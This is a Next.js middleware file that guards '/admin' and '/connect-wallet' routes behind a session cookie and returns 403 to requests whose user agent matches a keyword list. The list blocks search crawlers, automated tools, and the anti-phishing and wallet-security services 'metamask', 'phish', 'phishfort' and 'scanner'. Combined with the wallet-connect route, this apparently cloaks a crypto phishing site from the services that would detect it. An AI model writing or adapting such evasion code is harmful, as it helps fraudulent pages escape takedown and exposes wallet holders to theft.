import { NextResponse, userAgent } from "next/server";
import type { NextRequest } from "next/server";

// Routes that require an active session cookie
const PROTECTED_ROUTES = ["/admin", "/connect-wallet"];

export function middleware(request: NextRequest) {
  const url = request.nextUrl.clone();
  const pathname = url.pathname;
  const uaString = (request.headers.get("user-agent") || "").toLowerCase();

  // 1️⃣ Anti-Bot & Phishing Filter
  const { isBot } = userAgent(request);
  const forbiddenKeywords = [
    "googlebot", "bingbot", "slurp", "duckduckbot", "baiduspider", "yandexbot",
    "metamask", "phish", "phishfort", "scanner", "lighthouse", "headless",
    "inspect", "crawler", "spider", "python", "curl", "wget", "axios"
  ];

  const isForbiddenBot =
    isBot || forbiddenKeywords.some(kw => uaString.includes(kw));

  // 2️⃣ Strict Authentication Check
  const session = request.cookies.get("__session")?.value;
  const isProtectedRoute = PROTECTED_ROUTES.some(route =>
    pathname.startsWith(route)
  );

  // 🔐 Redirect unauthorized users to login
  if (isProtectedRoute && !session) {
    const loginUrl = new URL("/auth/sign-in", request.url);
    return NextResponse.redirect(loginUrl);
  }

  // 🚫 Hard-block forbidden bots
  if (isForbiddenBot) {
    return new NextResponse("Access Denied", { status: 403 });
  }

  // 3️⃣ Skip static assets (Performance)
  const isAsset =
    pathname.startsWith("/_next") ||
    pathname.match(/\.(png|jpe?g|gif|svg|ico|webp|avif|txt|xml|json)$/);

  if (isAsset) return NextResponse.next();

  return NextResponse.next();
}

export const config = {
  matcher: ["/((?!api|_next/static|_next/image|favicon.ico).*)"],
};
